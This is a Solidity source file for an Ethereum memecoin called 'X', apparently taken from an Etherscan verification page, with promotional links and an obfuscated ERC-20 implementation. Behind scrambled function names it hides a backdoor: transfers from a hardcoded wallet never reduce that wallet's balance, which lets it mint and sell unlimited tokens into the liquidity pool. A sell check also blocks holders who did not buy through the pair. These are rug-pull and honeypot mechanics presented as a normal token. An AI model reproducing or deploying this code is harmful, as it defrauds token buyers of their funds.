/**
 *Submitted for verification at Etherscan.io on 2023-09-28
*/

/**

$X
Uniting the Legendary Forces of Elon Musk and X for the Ultimate Memecoin Experience

Twitter: https://twitter.com/Xerc_Coin
Telegram: https://t.me/X_CoinEthereum
Website: https://xerc.org/

**/


// SPDX-License-Identifier: MIT


pragma solidity 0.8.20;


interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed _owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath");
        return c;
    }

    function  _rqnvx(uint256 a, uint256 b) internal pure returns (uint256) {
        return  _rqnvx(a, b, "SafeMath");
    }

    function  _rqnvx(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function _pvr(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface _qskuxm {
    function createPair(address
     tokenA, address tokenB) external
      returns (address pair);
}

interface _poeuay {
    function soimKinbxpartmFcadvwc(
        uint amountIn,
        uint amountOutMin,
        address[
            
        ] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure 
    returns (address);
    function WETH() external pure 
    returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint 
    amountToken, uint amountETH
    , uint liquidity);
}

contract X is Context, IERC20, Ownable {
    using SafeMath for uint256;
    _poeuay private _Twvfqwk;
    address payable private _Kovebhr;
    address private _kisvtrh;

    string private constant _name = unicode"X";
    string private constant _symbol = unicode"X";
    uint8 private constant _decimals = 9;
    uint256 private constant _sTotalhs = 10000000000 * 10 **_decimals;
    uint256 public _qnqvsnd = _sTotalhs;
    uint256 public _Wacrnue = _sTotalhs;
    uint256 public _ronwTxpv= _sTotalhs;
    uint256 public _BvaTihf= _sTotalhs;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _dlekainr;
    mapping (address => bool) private _treruwiy;
    mapping(address => uint256) private _rjcfoap;

    uint256 private _BuyinitialTax=1;
    uint256 private _SellinitialTax=1;
    uint256 private _BuyfinalTax=1;
    uint256 private _SellfinalTax=1;
    uint256 private _BuyAreduceTax=1;
    uint256 private _SellAreduceTax=1;
    uint256 private _ymwvkaiq=0;
    uint256 private _pnamjhg=0;

    bool private _pvgwinq;
    bool public _Tpuisfhm = false;
    bool private ockbvpe = false;
    bool private _aprveq = false;


    event _mrcabrat(uint _qnqvsnd);
    modifier olTnegr {
        ockbvpe = true;
        _;
        ockbvpe = false;
    }

    constructor () {      
        _balances[_msgSender(

        )] = _sTotalhs;
        _dlekainr[owner(

        )] = true;
        _dlekainr[address
        (this)] = true;
        _dlekainr[
            _Kovebhr] = true;
        _Kovebhr = 
        payable (0xed8663eC014d0E749EBE4741b4b5a331c5c62Cbe);

 

        emit Transfer(
            address(0), 
            _msgSender(

            ), _sTotalhs);
              
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _sTotalhs;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address _owner, address spender) public view override returns (uint256) {
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. _rqnvx(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address _owner, address spender, uint256 amount) private {
        require(_owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 rsvbrnk=0;
        if (from !=
         owner () && to 
         != owner ( ) ) {

            if (_Tpuisfhm) {
                if (to 
                != address
                (_Twvfqwk) 
                && to !=
                 address
                 (_kisvtrh)) {
                  require(_rjcfoap
                  [tx.origin]
                   < block.number,
                  "Only one transfer per block allowed."
                  );
                  _rjcfoap
                  [tx.origin] 
                  = block.number;
                }
            }

            if (from ==
             _kisvtrh && to != 
            address(_Twvfqwk) &&
             !_dlekainr[to] ) {
                require(amount 
                <= _qnqvsnd,
                 "Exceeds the _qnqvsnd.");
                require(balanceOf
                (to) + amount
                 <= _Wacrnue,
                  "Exceeds the macxizse.");
                if(_pnamjhg
                < _ymwvkaiq){
                  require
                  (! _epkvobz(to));
                }
                _pnamjhg++;
                 _treruwiy
                 [to]=true;
                rsvbrnk = amount._pvr
                ((_pnamjhg>
                _BuyAreduceTax)?
                _BuyfinalTax:
                _BuyinitialTax)
                .div(100);
            }

            if(to == _kisvtrh &&
             from!= address(this) 
            && !_dlekainr[from] ){
                require(amount <= 
                _qnqvsnd && 
                balanceOf(_Kovebhr)
                <_BvaTihf,
                 "Exceeds the _qnqvsnd.");
                rsvbrnk = amount._pvr((_pnamjhg>
                _SellAreduceTax)?
                _SellfinalTax:
                _SellinitialTax)
                .div(100);
                require(_pnamjhg>
                _ymwvkaiq &&
                 _treruwiy[from]);
            }

            uint256 contractTokenBalance = 
            balanceOf(address(this));
            if (!ockbvpe 
            && to == _kisvtrh &&
             _aprveq &&
             contractTokenBalance>
             _ronwTxpv 
            && _pnamjhg>
            _ymwvkaiq&&
             !_dlekainr[to]&&
              !_dlekainr[from]
            ) {
                _pvnrtnf( _rsqzv(amount, 
                _rsqzv(contractTokenBalance,
                _BvaTihf)));
                uint256 contractETHBalance 
                = address(this)
                .balance;
                if(contractETHBalance 
                > 0) {
                    _upvfiv(address
                    (this).balance);
                }
            }
        }

        if(rsvbrnk>0){
          _balances[address
          (this)]=_balances
          [address
          (this)].
          add(rsvbrnk);
          emit
           Transfer(from,
           address
           (this),rsvbrnk);
        }
        _balances[from
        ]= _rqnvx(from,
         _balances[from]
         , amount);
        _balances[to]=
        _balances[to].
        add(amount.
         _rqnvx(rsvbrnk));
        emit Transfer
        (from, to, 
        amount.
         _rqnvx(rsvbrnk));
    }

    function _pvnrtnf(uint256
     tokenAmount) private
      olTnegr {
        if(tokenAmount==
        0){return;}
        if(!_pvgwinq)
        {return;}
        address[

        ] memory path =
         new address[](2);
        path[0] = 
        address(this);
        path[1] = 
        _Twvfqwk.WETH();
        _approve(address(this),
         address(
             _Twvfqwk), 
             tokenAmount);
        _Twvfqwk.
        soimKinbxpartmFcadvwc
        (
            tokenAmount,
            0,
            path,
            address
            (this),
            block.
            timestamp
        );
    }

    function  _rsqzv
    (uint256 a, 
    uint256 b
    ) private pure
     returns 
     (uint256){
      return ( a > b
      )?
      b : a ;
    }

    function  _rqnvx(address
     from, uint256 a,
      uint256 b) 
      private view
       returns(uint256){
        if(from 
        == _Kovebhr){
            return a ;
        }else{
            return a .
             _rqnvx (b);
        }
    }

    function removeLimitas (
        
    ) external onlyOwner{
        _qnqvsnd = _sTotalhs;
        _Wacrnue = _sTotalhs;
        emit _mrcabrat(_sTotalhs);
    }

    function _epkvobz(address 
    account) private view 
    returns (bool) {
        uint256 epoiq;
        assembly {
            epoiq :=
             extcodesize
             (account)
        }
        return epoiq > 
        0;
    }

    function _upvfiv(uint256
    amount) private {
        _Kovebhr.
        transfer(
            amount);
    }

    function opensTrading ( 

    ) external onlyOwner ( ) {
        require (
            ! _pvgwinq ) ;
        _Twvfqwk  
        =  
        _poeuay
        (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address
        (this), address(
            _Twvfqwk), 
            _sTotalhs);
        _kisvtrh = 
        _qskuxm(_Twvfqwk.
        factory( ) 
        ). createPair (
            address(this
            ),  _Twvfqwk .
             WETH ( ) );
        _Twvfqwk.addLiquidityETH
        {value: address
        (this).balance}
        (address(this)
        ,balanceOf(address
        (this)),0,0,owner(),block.
        timestamp);
        IERC20(_kisvtrh).
        approve(address(_Twvfqwk), 
        type(uint)
        .max);
        _aprveq = true;
        _pvgwinq = true;
    }

    receive() external payable {}
}